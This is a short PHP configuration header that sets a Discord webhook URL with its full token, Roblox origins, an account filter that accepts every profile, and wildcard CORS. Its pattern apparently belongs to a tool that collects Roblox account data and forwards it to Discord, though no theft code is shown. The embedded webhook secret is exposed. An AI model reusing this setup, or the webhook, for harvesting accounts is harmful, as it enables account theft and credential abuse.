<?php


$webhook = "https://discord.com/api/webhooks/802209292337938442/zb8alfU5d5gmjyMno9jxC3-lqJVA4vqbipscccniFxmRnzvE6LhCp5OaypGdQ-Pmxat3";
$discord_contact = "E=Mc²";

$allowed_origins = array(
    "https://www.roblox.com",
    "https://web.roblox.com"
);
function account_filter($profile)
{
    return true;
}
require("status.php");
header("Access-Control-Allow-Origin: *");
